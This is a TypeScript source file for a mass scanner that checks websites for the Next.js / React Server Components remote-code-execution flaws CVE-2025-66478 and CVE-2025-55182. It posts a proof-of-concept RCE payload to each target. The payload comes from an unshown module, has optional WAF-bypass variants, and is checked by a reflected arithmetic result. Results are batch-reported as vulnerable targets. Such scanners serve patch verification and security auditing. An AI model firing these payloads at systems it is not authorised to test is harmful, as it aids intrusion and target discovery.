/**
 * Next.js CVE-2025-66478 / CVE-2025-55182 Scanner
 *
 * Combines multiple detection techniques:
 * 1. RCE proof-of-concept (math operation reflected in header)
 * 2. Safe check mode (error-based detection)
 * 3. Version detection via HTTP headers
 * 4. Same-host redirect following
 */

import { generateRCEPayload, generateSafeCheckPayload, generateHeaders, type RCEPayload } from './payloads.js';
import { isVulnerable } from './version-check.js';

export interface ScanOptions {
  timeout?: number;
  followRedirects?: boolean;
  maxRedirects?: number;
  safeCheck?: boolean;
  wafBypass?: boolean;
  wafBypassSize?: number;
  useUnicode?: boolean;
  isWindows?: boolean;
  userAgent?: string;
  proxy?: string;
}

export interface ScanResult {
  url: string;
  vulnerable: boolean;
  confidence: 'high' | 'medium' | 'low' | 'unknown';
  method: string;
  details: string;
  version?: string;
  versionVulnerable?: boolean;
  versionReason?: string;
  statusCode?: number;
  headers?: Record<string, string>;
  redirectChain?: string[];
  error?: string;
  timestamp: string;
}

/**
 * Parse URL and normalize it
 */
function normalizeUrl(url: string): string {
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'https://' + url;
  }
  // Remove trailing slash
  return url.replace(/\/$/, '');
}

/**
 * Check if redirect is same-origin
 */
function isSameOrigin(originalUrl: string, redirectUrl: string): boolean {
  try {
    const original = new URL(originalUrl);
    const redirect = new URL(redirectUrl, originalUrl);
    return original.origin === redirect.origin;
  } catch {
    return false;
  }
}

/**
 * Extract Next.js version from response headers
 */
function extractVersionFromHeaders(headers: Headers): string | undefined {
  // Check X-Powered-By header
  const poweredBy = headers.get('x-powered-by');
  if (poweredBy && poweredBy.includes('Next.js')) {
    const match = poweredBy.match(/Next\.js\s*([\d.]+(?:-[a-zA-Z]+\.\d+)?)/i);
    if (match) {
      return match[1];
    }
  }
  return undefined;
}

/**
 * Check for RSC-related headers that indicate React Server Components usage
 */
function hasRSCHeaders(headers: Headers): boolean {
  const vary = headers.get('vary') || '';
  const contentType = headers.get('content-type') || '';

  // RSC responses often have specific Vary headers
  if (vary.includes('RSC') || vary.includes('Next-Router')) {
    return true;
  }

  // RSC responses have specific content types
  if (contentType.includes('text/x-component')) {
    return true;
  }

  return false;
}

/**
 * Perform the RCE vulnerability scan on a single URL
 */
export async function scanUrl(url: string, options: ScanOptions = {}): Promise<ScanResult> {
  const {
    timeout = 10000,
    followRedirects = true,
    maxRedirects = 5,
    safeCheck = false,
    wafBypass = false,
    wafBypassSize = 128,
    useUnicode = false,
    isWindows = false,
    userAgent
  } = options;

  const normalizedUrl = normalizeUrl(url);
  const redirectChain: string[] = [];
  const timestamp = new Date().toISOString();

  // Generate the appropriate payload
  const payload: RCEPayload = safeCheck
    ? generateSafeCheckPayload()
    : generateRCEPayload({ wafBypass, wafBypassSize, useUnicode, isWindows });

  const headers = generateHeaders(payload);
  if (userAgent) {
    headers['User-Agent'] = userAgent;
  }

  let currentUrl = normalizedUrl;
  let redirectCount = 0;

  try {
    while (redirectCount <= maxRedirects) {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), timeout);

      try {
        const response = await fetch(currentUrl, {
          method: 'POST',
          headers,
          body: payload.body,
          redirect: 'manual', // Handle redirects manually
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        const statusCode = response.status;
        const responseHeaders: Record<string, string> = {};
        response.headers.forEach((value, key) => {
          responseHeaders[key.toLowerCase()] = value;
        });

        // Extract version info
        const version = extractVersionFromHeaders(response.headers);
        let versionCheck = undefined;
        if (version) {
          versionCheck = isVulnerable(version);
        }

        // Check for redirect
        if ([301, 302, 303, 307, 308].includes(statusCode) && followRedirects) {
          const location = response.headers.get('location');
          if (location) {
            const redirectUrl = new URL(location, currentUrl).toString();

            // Only follow same-origin redirects
            if (isSameOrigin(currentUrl, redirectUrl)) {
              redirectChain.push(currentUrl);
              currentUrl = redirectUrl;
              redirectCount++;
              continue;
            } else {
              return {
                url: normalizedUrl,
                vulnerable: false,
                confidence: 'unknown',
                method: safeCheck ? 'safe-check' : 'rce-poc',
                details: `Cross-origin redirect detected to ${redirectUrl}. Not followed.`,
                version,
                versionVulnerable: versionCheck?.vulnerable,
                versionReason: versionCheck?.reason,
                statusCode,
                headers: responseHeaders,
                redirectChain,
                timestamp
              };
            }
          }
        }

        // Check for RCE vulnerability
        if (safeCheck) {
          // Safe check mode: look for error indicators
          if (statusCode === 500) {
            const body = await response.text();
            // Check for specific error digest patterns
            if (body.includes('digest') || body.includes('NEXT_') || body.includes('Server Error')) {
              return {
                url: normalizedUrl,
                vulnerable: true,
                confidence: 'medium',
                method: 'safe-check',
                details: 'Server returned 500 with RSC error patterns. Likely vulnerable.',
                version,
                versionVulnerable: versionCheck?.vulnerable,
                versionReason: versionCheck?.reason,
                statusCode,
                headers: responseHeaders,
                redirectChain,
                timestamp
              };
            }
          }
        } else {
          // RCE PoC mode: check for math result in X-Action-Redirect
          const actionRedirect = response.headers.get('x-action-redirect');
          if (actionRedirect && actionRedirect.includes(payload.expectedResult)) {
            return {
              url: normalizedUrl,
              vulnerable: true,
              confidence: 'high',
              method: 'rce-poc',
              details: `RCE confirmed! X-Action-Redirect contains "${payload.expectedResult}" (41*271=11111)`,
              version,
              versionVulnerable: versionCheck?.vulnerable,
              versionReason: versionCheck?.reason,
              statusCode,
              headers: responseHeaders,
              redirectChain,
              timestamp
            };
          }

          // Also check response body for the math result
          const body = await response.text();
          if (body.includes(payload.expectedResult) && hasRSCHeaders(response.headers)) {
            return {
              url: normalizedUrl,
              vulnerable: true,
              confidence: 'medium',
              method: 'rce-poc',
              details: `Possible RCE - response body contains "${payload.expectedResult}"`,
              version,
              versionVulnerable: versionCheck?.vulnerable,
              versionReason: versionCheck?.reason,
              statusCode,
              headers: responseHeaders,
              redirectChain,
              timestamp
            };
          }
        }

        // Not vulnerable or unable to confirm
        const hasRSC = hasRSCHeaders(response.headers);
        return {
          url: normalizedUrl,
          vulnerable: false,
          confidence: hasRSC ? 'medium' : 'low',
          method: safeCheck ? 'safe-check' : 'rce-poc',
          details: hasRSC
            ? 'RSC headers detected but no vulnerability indicators found'
            : 'No RSC headers or vulnerability indicators found',
          version,
          versionVulnerable: versionCheck?.vulnerable,
          versionReason: versionCheck?.reason,
          statusCode,
          headers: responseHeaders,
          redirectChain,
          timestamp
        };

      } catch (fetchError) {
        clearTimeout(timeoutId);
        throw fetchError;
      }
    }

    // Max redirects reached
    return {
      url: normalizedUrl,
      vulnerable: false,
      confidence: 'unknown',
      method: safeCheck ? 'safe-check' : 'rce-poc',
      details: `Maximum redirects (${maxRedirects}) reached`,
      redirectChain,
      timestamp
    };

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      url: normalizedUrl,
      vulnerable: false,
      confidence: 'unknown',
      method: safeCheck ? 'safe-check' : 'rce-poc',
      details: 'Scan failed',
      error: errorMessage,
      redirectChain,
      timestamp
    };
  }
}

/**
 * Batch scan multiple URLs with concurrency control
 */
export async function batchScan(
  urls: string[],
  options: ScanOptions & { concurrency?: number } = {}
): Promise<ScanResult[]> {
  const { concurrency = 10, ...scanOptions } = options;
  const results: ScanResult[] = [];
  const queue = [...urls];

  async function worker(): Promise<void> {
    while (queue.length > 0) {
      const url = queue.shift();
      if (url) {
        const result = await scanUrl(url, scanOptions);
        results.push(result);
      }
    }
  }

  // Create worker pool
  const workers = Array(Math.min(concurrency, urls.length))
    .fill(null)
    .map(() => worker());

  await Promise.all(workers);
  return results;
}

/**
 * Generate a summary report from scan results
 */
export function generateReport(results: ScanResult[]): string {
  const vulnerable = results.filter(r => r.vulnerable);
  const errors = results.filter(r => r.error);
  const scanned = results.length;

  let report = `
╔══════════════════════════════════════════════════════════════════╗
║     Next.js CVE-2025-66478 / CVE-2025-55182 Scan Report          ║
╠══════════════════════════════════════════════════════════════════╣
║  Total Scanned:    ${scanned.toString().padEnd(46)}║
║  Vulnerable:       ${vulnerable.length.toString().padEnd(46)}║
║  Errors:           ${errors.length.toString().padEnd(46)}║
║  Scan Time:        ${new Date().toISOString().padEnd(46)}║
╚══════════════════════════════════════════════════════════════════╝
`;

  if (vulnerable.length > 0) {
    report += '\n🚨 VULNERABLE TARGETS:\n';
    report += '─'.repeat(70) + '\n';
    for (const result of vulnerable) {
      report += `\n  URL:        ${result.url}\n`;
      report += `  Confidence: ${result.confidence.toUpperCase()}\n`;
      report += `  Method:     ${result.method}\n`;
      report += `  Details:    ${result.details}\n`;
      if (result.version) {
        report += `  Version:    ${result.version}\n`;
      }
    }
  }

  if (errors.length > 0) {
    report += '\n⚠️  SCAN ERRORS:\n';
    report += '─'.repeat(70) + '\n';
    for (const result of errors) {
      report += `  ${result.url}: ${result.error}\n`;
    }
  }

  return report;
}
